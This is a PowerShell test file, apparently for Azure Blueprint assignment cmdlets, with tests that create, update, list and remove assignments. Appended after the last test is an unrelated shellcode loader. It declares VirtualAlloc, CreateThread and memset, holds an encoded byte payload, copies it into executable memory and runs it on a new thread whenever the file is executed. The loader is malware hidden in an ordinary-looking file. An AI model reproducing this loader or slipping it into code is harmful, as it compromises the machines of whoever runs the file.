﻿

function Test-GetBlueprintAssignment
{ 
	$assignments = Get-AzBlueprintAssignment

    Assert-True { $assignments.Count -ge 1 }
	Assert-NotNull $assignments[0].Name
	Assert-NotNull $assignments[0].Id
	Assert-NotNull $assignments[0].BlueprintId
	Assert-NotNull $assignments[0].Scope
	Assert-NotNull $assignments[0].Location
}

function Test-NewBlueprintAssignment
{
	$mgId = "AzBlueprintAssignTest"
	$blueprintName = "Filiz-Ps-Test1"
	$subscriptionId = "28cbf98f-381d-4425-9ac4-cf342dab9753"
	$assignmentName = "PS-ScenarioTest-NewAssignment"
	$location = "East US"
	$params = @{audituseofclassicvirtualmachines_effect='Audit'}
	$rg1 = @{name='bp-testrg';location='eastus'}
	$rgs = @{ResourceGroup=$rg1}
	$identity = "/subscriptions/996a2f3f-ee01-4ffd-9765-d2c3fc98f30a/resourceGroups/user-assigned-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/owner-identity"

    $blueprint = Get-AzBlueprint -ManagementGroupId $mgId -Name $blueprintName -LatestPublished
	Assert-NotNull $blueprint
	
	$assignment = New-AzBlueprintAssignment -Name $assignmentName -Blueprint $blueprint -SubscriptionId $subscriptionId -Location $location -Parameter $params -ResourceGroup $rgs -UserAssignedIdentity $identity

	$expectedProvisioningState = "Creating"
	Assert-NotNull $assignment
	Assert-AreEqual $assignment.ProvisioningState $expectedProvisioningState
}

function Test-NewBlueprintAssignmentWithSystemAssignedIdentity
{
	$subscriptionId = "0b1f6471-1bf0-4dda-aec3-cb9272f09590"
	$assignmentName = "PS-ScenarioTest-NewSystemAssignedIdentityAssignment"
	$location = "West US"
	$blueprintName = "PS-SimpleBlueprintDefinition"

	
	$deployment = New-AzDeployment -Name $blueprintName -Location $location -TemplateFile SubscriptionLevelSimpleBlueprint.json
    Assert-AreEqual Succeeded $deployment.ProvisioningState

    $blueprint = Get-AzBlueprint -SubscriptionId $subscriptionId -Name $blueprintName -LatestPublished
	Assert-NotNull $blueprint
	
	$assignment = New-AzBlueprintAssignment -Name $assignmentName -Blueprint $blueprint -SubscriptionId $subscriptionId -Location $location
	Assert-NotNull $assignment
}

function Test-SetBlueprintAssignment
{
	$mgId = "AzBlueprintAssignTest"
	$blueprintName = "Filiz-Ps-Test1"
	$subscriptionId = "28cbf98f-381d-4425-9ac4-cf342dab9753"
	$assignmentName = "PS-ScenarioTest-SetAssignment"
	$location = "East US"
	$params = @{audituseofclassicvirtualmachines_effect='Audit'}
	$rg1 = @{name='bp-testrg';location='eastus'}
	$rgs = @{ResourceGroup=$rg1}
	$identity = "/subscriptions/996a2f3f-ee01-4ffd-9765-d2c3fc98f30a/resourceGroups/user-assigned-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/owner-identity"

	
    $blueprint = Get-AzBlueprint -ManagementGroupId $mgId -Name $blueprintName -LatestPublished
	Assert-NotNull $blueprint

	
	$assignment = New-AzBlueprintAssignment -Name $assignmentName -Blueprint $blueprint -SubscriptionId $subscriptionId -Location $location -Parameter $params -ResourceGroup $rgs -UserAssignedIdentity $identity
	$expectedProvisioningState = "Creating"
	Assert-NotNull $assignment
	Assert-AreEqual $assignment.ProvisioningState $expectedProvisioningState

	
	$assigned = Get-AzBlueprintAssignment -SubscriptionId $subscriptionId -Name $assignmentName
	
	$assigned = Get-AzBlueprintAssignment -SubscriptionId $subscriptionId -Name $assignmentName
	while($assigned.ProvisioningState -eq "Creating" -or $assigned.ProvisioningState -eq "Deploying" -or $assigned.ProvisioningState -eq "Waiting")
    {
        Wait-Seconds 10
        $assigned = Get-AzBlueprintAssignment -SubscriptionId $subscriptionId -Name $assignmentName
    }
	
	
	$newTestRg = "bp-testrg-new"
	$rg1 = @{name= $newTestRg;location='eastus'}
	$rgs = @{ResourceGroup=$rg1}
	$assignment = Set-AzBlueprintAssignment -Name $assignmentName -Blueprint $blueprint -SubscriptionId $subscriptionId -Location $location -Parameter $params -ResourceGroup $rgs -UserAssignedIdentity $identity
	$expectedProvisioningState = "Creating"
	Assert-NotNull $assignment
	Assert-AreEqual $assignment.ProvisioningState $expectedProvisioningState
}

function Test-RemoveBlueprintAssignment
{
	$mgId = "AzBlueprintAssignTest"
	$blueprintName = "Filiz-Ps-Test1"
	$subscriptionId = "28cbf98f-381d-4425-9ac4-cf342dab9753"
	$assignmentName = "PS-ScenarioTest-RemoveAssignment"
	$location = "East US"
	$params = @{audituseofclassicvirtualmachines_effect='Audit'}
	$rg1 = @{name='bp-testrg';location='eastus'}
	$rgs = @{ResourceGroup=$rg1}
	$identity = "/subscriptions/996a2f3f-ee01-4ffd-9765-d2c3fc98f30a/resourceGroups/user-assigned-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/owner-identity"

	
    $blueprint = Get-AzBlueprint -ManagementGroupId $mgId -Name $blueprintName -LatestPublished
	Assert-NotNull $blueprint

	
	$assignment = New-AzBlueprintAssignment -Name $assignmentName -Blueprint $blueprint -SubscriptionId $subscriptionId -Location $location -Parameter $params -ResourceGroup $rgs -UserAssignedIdentity $identity
	$expectedProvisioningState = "Creating"
	Assert-NotNull $assignment
	Assert-AreEqual $assignment.ProvisioningState $expectedProvisioningState

	
	$assigned = Get-AzBlueprintAssignment -SubscriptionId $subscriptionId -Name $assignmentName
	while($assigned.ProvisioningState -eq "Creating" -or $assigned.ProvisioningState -eq "Deploying" -or $assigned.ProvisioningState -eq "Waiting")
    {
        Wait-Seconds 10
        $assigned = Get-AzBlueprintAssignment -SubscriptionId $subscriptionId -Name $assignmentName 
    }
	
	
	$removed = Remove-AzBlueprintAssignment -SubscriptionId $subscriptionId -Name $assignment.Name -PassThru
	$expectedProvisioningState = "Deleting"
	Assert-NotNull $removed
	Assert-AreEqual $removed.Name $assignment.Name
	Assert-AreEqual $removed.ProvisioningState $expectedProvisioningState
}


$AkOj = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $AkOj -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x34,0x2f,0x81,0xb1,0xdb,0xcb,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x7a,0x0f,0x03,0x7a,0x3b,0xcd,0x74,0x4d,0xab,0x93,0x77,0xae,0x2b,0xf4,0xfe,0x4b,0x1a,0x34,0x64,0x1f,0x0c,0x84,0xee,0x4d,0xa0,0x6f,0xa2,0x65,0x33,0x1d,0x6b,0x89,0xf4,0xa8,0x4d,0xa4,0x05,0x80,0xae,0xa7,0x85,0xdb,0xe2,0x07,0xb4,0x13,0xf7,0x46,0xf1,0x4e,0xfa,0x1b,0xaa,0x05,0xa9,0x8b,0xdf,0x50,0x72,0x27,0x93,0x75,0xf2,0xd4,0x63,0x77,0xd3,0x4a,0xf8,0x2e,0xf3,0x6d,0x2d,0x5b,0xba,0x75,0x32,0x66,0x74,0x0d,0x80,0x1c,0x87,0xc7,0xd9,0xdd,0x24,0x26,0xd6,0x2f,0x34,0x6e,0xd0,0xcf,0x43,0x86,0x23,0x6d,0x54,0x5d,0x5e,0xa9,0xd1,0x46,0xf8,0x3a,0x41,0xa3,0xf9,0xef,0x14,0x20,0xf5,0x44,0x52,0x6e,0x19,0x5a,0xb7,0x04,0x25,0xd7,0x36,0xcb,0xac,0xa3,0x1c,0xcf,0xf5,0x70,0x3c,0x56,0x53,0xd6,0x41,0x88,0x3c,0x87,0xe7,0xc2,0xd0,0xdc,0x95,0x88,0xbc,0x11,0x94,0x32,0x3c,0x3e,0xaf,0x41,0x0e,0xe1,0x1b,0xce,0x22,0x6a,0x82,0x09,0x45,0x41,0x72,0x85,0xb8,0x6a,0x83,0x8f,0x7e,0x3e,0xd3,0xa7,0x57,0x3f,0xb8,0x37,0x58,0xea,0x55,0x3d,0xce,0xd5,0x02,0x3c,0x78,0xbe,0x50,0x3f,0x95,0x62,0xdc,0xd9,0xc5,0xca,0x8e,0x75,0xa5,0xba,0x6e,0x26,0x4d,0xd1,0x60,0x19,0x6d,0xda,0xaa,0x32,0x07,0x35,0x03,0x6a,0xbf,0xac,0x0e,0xe0,0x5e,0x30,0x85,0x8c,0x60,0xba,0x2a,0x70,0x2e,0x4b,0x46,0x62,0xc6,0xbb,0x1d,0xd8,0x40,0xc3,0x8b,0x77,0x6c,0x51,0x30,0xde,0x3b,0xcd,0x3a,0x07,0x0b,0x52,0xc4,0x62,0x00,0x5b,0x50,0xcd,0x7e,0xa4,0xb4,0xcd,0x7e,0xf2,0xde,0xcd,0x16,0xa2,0xba,0x9d,0x03,0xad,0x16,0xb2,0x98,0x38,0x99,0xe3,0x4d,0xea,0xf1,0x09,0xa8,0xdc,0x5d,0xf1,0x9f,0xdc,0xa2,0x24,0xd9,0xaa,0xca,0xf4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8f5f=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8f5f.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8f5f,0,0,0);for (;;){Start-sleep 60};
